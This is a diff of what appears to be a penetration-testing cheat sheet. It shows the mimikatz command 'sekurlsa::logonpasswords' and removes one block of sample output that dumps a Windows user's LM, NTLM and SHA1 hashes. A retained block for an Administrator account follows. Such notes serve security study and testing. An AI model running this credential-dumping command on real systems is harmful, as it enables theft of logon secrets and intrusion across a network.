@@ -212,35 +212,6 @@ mimikatz (cmd needs to run administrators rights / locally)
 
 	mimikatz # sekurlsa::logonpasswords
 
-	Authentication Id : 0 ; 6433270 (00000000:006229f6)
-	Session           : Interactive from 1
-	User Name         : win7
-	Domain            : THOR
-	Logon Server      : THOR
-	Logon Time        : 13.08.2021 12:05:52
-	SID               : S-1-5-21-3401829504-2746700306-4210517594-10
-			msv :
-			 [00000003] Primary
-			 * Username : win7
-			 * Domain   : THOR
-			 * LM       : aad3b435b51404eeaad3b435b51404ee
-			 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
-			 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
-			tspkg :
-			 * Username : win7
-			 * Domain   : THOR
-			 * Password : (null)
-			wdigest :
-			 * Username : win7
-			 * Domain   : THOR
-			 * Password : (null)
-			kerberos :
-			 * Username : win7
-			 * Domain   : THOR
-			 * Password : (null)
-			ssp :
-			credman :
-
 	Authentication Id : 0 ; 5990364 (00000000:005b67dc)
 	Session           : CachedInteractive from 1
 	User Name         : Administrator
